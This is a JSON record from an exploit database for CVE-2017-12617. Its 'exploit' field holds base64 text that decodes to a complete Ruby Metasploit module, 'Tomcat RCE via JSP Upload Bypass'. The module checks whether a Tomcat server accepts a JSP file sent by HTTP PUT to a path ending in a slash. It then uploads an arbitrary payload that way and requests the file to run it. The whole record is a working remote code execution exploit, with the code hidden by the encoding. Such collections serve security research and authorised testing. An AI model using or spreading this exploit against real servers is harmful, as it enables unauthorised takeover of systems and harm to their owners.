{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpjbGFzcyBNZXRhc3Bsb2l0TW9kdWxlIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCg0KICBSYW5rID0gRXhjZWxsZW50UmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICAgPT4gJ1RvbWNhdCBSQ0UgdmlhIEpTUCBVcGxvYWQgQnlwYXNzJywNCiAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgIFRoaXMgbW9kdWxlIHVwbG9hZHMgYSBqc3AgcGF5bG9hZCBhbmQgZXhlY3V0ZXMgaXQuDQogICAgICB9LA0KICAgICAgJ0F1dGhvcicgICAgICA9PiAncGVld3B3JywNCiAgICAgICdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnUmVmZXJlbmNlcycgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdDVkUnLCAnMjAxNy0xMjYxNycgXSwNCiAgICAgICAgICBbICdVUkwnLCAnaHR0cDovL2N2ZS5taXRyZS5vcmcvY2dpLWJpbi9jdmVuYW1lLmNnaT9uYW1lPUNWRS0yMDE3LTEyNjE3JyBdLA0KICAgICAgICAgIFsgJ1VSTCcsICdodHRwczovL2J6LmFwYWNoZS5vcmcvYnVnemlsbGEvc2hvd19idWcuY2dpP2lkPTYxNTQyJyBdDQogICAgICAgIF0sDQogICAgICAnUHJpdmlsZWdlZCcgICAgID0+IGZhbHNlLA0KICAgICAgJ1BsYXRmb3JtJyAgICA9PiAld3sgbGludXggd2luIH0sICMgb3RoZXJzPw0KICAgICAgJ1RhcmdldHMnICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWyAnQXV0b21hdGljJywNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgJ0FyY2gnID0+IEFSQ0hfSkFWQSwNCiAgICAgICAgICAgICAgJ1BsYXRmb3JtJyA9PiAnd2luJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIF0sDQogICAgICAgICAgWyAnSmF2YSBXaW5kb3dzJywNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgJ0FyY2gnID0+IEFSQ0hfSkFWQSwNCiAgICAgICAgICAgICAgJ1BsYXRmb3JtJyA9PiAnd2luJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIF0sDQogICAgICAgICAgWyAnSmF2YSBMaW51eCcsDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICdBcmNoJyA9PiBBUkNIX0pBVkEsDQogICAgICAgICAgICAgICdQbGF0Zm9ybScgPT4gJ2xpbnV4Jw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIF0NCiAgICAgICAgXSwNCiAgICAgICdEaXNjbG9zdXJlRGF0ZScgPT4gJ09jdCAwMyAyMDE3JywNCiAgICAgICdEZWZhdWx0VGFyZ2V0JyAgPT4gMCkpDQoNCiAgICByZWdpc3Rlcl9vcHRpb25zKFsNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnVEFSR0VUVVJJJywgW3RydWUsICJUaGUgVVJJIHBhdGggb2YgdGhlIFRvbWNhdCBpbnN0YWxsYXRpb24iLCAiLyJdKSwNCiAgICAgICAgT3B0OjpSUE9SVCg4MDgwKQ0KICAgICAgXSkNCiAgZW5kDQoNCiAgZGVmIGNoZWNrDQogICAgdGVzdHVybCA9IFJleDo6VGV4dDo6cmFuZF90ZXh0X2FscGhhKDEwKQ0KICAgIHRlc3Rjb250ZW50ID0gUmV4OjpUZXh0OjpyYW5kX3RleHRfYWxwaGEoMTApDQoNCiAgICBzZW5kX3JlcXVlc3RfY2dpKHsNCiAgICAgICd1cmknICAgICAgID0+IG5vcm1hbGl6ZV91cmkodGFyZ2V0X3VyaS5wYXRoLCAiI3t0ZXN0dXJsfS5qc3AvIiksDQogICAgICAnbWV0aG9kJyAgICA9PiAnUFVUJywNCiAgICAgICdkYXRhJyAgICAgID0+ICI8JSBvdXQucHJpbnRsbihcIiN7dGVzdGNvbnRlbnR9XCIpOyU+Ig0KICAgIH0pDQoNCiAgICByZXMxID0gc2VuZF9yZXF1ZXN0X2NnaSh7DQogICAgICAndXJpJyAgICAgICA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgIiN7dGVzdHVybH0uanNwIiksDQogICAgICAnbWV0aG9kJyAgICA9PiAnR0VUJw0KICAgIH0pDQoNCiAgICBpZiByZXMxICYmIHJlczEuYm9keS5pbmNsdWRlPyh0ZXN0Y29udGVudCkNCiAgICAgIHNlbmRfcmVxdWVzdF9jZ2koDQogICAgICAgIG9wdHMgPSB7DQogICAgICAgICAgJ3VyaScgICAgICAgPT4gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsICIje3Rlc3R1cmx9LmpzcC8iKSwNCiAgICAgICAgICAnbWV0aG9kJyAgICA9PiAnREVMRVRFJw0KICAgICAgICB9LA0KICAgICAgICB0aW1lb3V0ID0gMQ0KICAgICAgKQ0KICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6VnVsbmVyYWJsZQ0KICAgIGVuZA0KDQogICAgRXhwbG9pdDo6Q2hlY2tDb2RlOjpTYWZlDQogIGVuZA0KDQogIGRlZiBleHBsb2l0DQogICAgcHJpbnRfc3RhdHVzKCJVcGxvYWRpbmcgcGF5bG9hZC4uLiIpDQogICAgdGVzdHVybCA9IFJleDo6VGV4dDo6cmFuZF90ZXh0X2FscGhhKDEwKQ0KDQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSh7DQogICAgICAndXJpJyAgICAgICA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgIiN7dGVzdHVybH0uanNwLyIpLA0KICAgICAgJ21ldGhvZCcgICAgPT4gJ1BVVCcsDQogICAgICAnZGF0YScgICAgICA9PiBwYXlsb2FkLmVuY29kZWQNCiAgICB9KQ0KICAgIGlmIHJlcyAmJiByZXMuY29kZSA9PSAyMDENCiAgICAgIHJlczEgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCiAgICAgICAgJ3VyaScgICAgICAgPT4gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsICIje3Rlc3R1cmx9LmpzcCIpLA0KICAgICAgICAnbWV0aG9kJyAgICA9PiAnR0VUJw0KICAgICAgfSkNCiAgICAgIGlmIHJlczEgJiYgcmVzMS5jb2RlID09IDIwMA0KICAgICAgICBwcmludF9zdGF0dXMoIlBheWxvYWQgZXhlY3V0ZWQhIikNCiAgICAgIGVsc2UNCiAgICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OlBheWxvYWRGYWlsZWQsICJGYWlsZWQgdG8gZXhlY3V0ZSB0aGUgcGF5bG9hZCIpDQogICAgICBlbmQNCiAgICBlbHNlDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5leHBlY3RlZFJlcGx5LCAiRmFpbGVkIHRvIHVwbG9hZCB0aGUgcGF5bG9hZCIpDQogICAgZW5kDQogIGVuZA0KDQplbmQ=", 
    "filename": "platforms/java/remote/43008.rb", 
    "id": "43008", 
    "cves": [
        "CVE-2017-12617"
    ]
}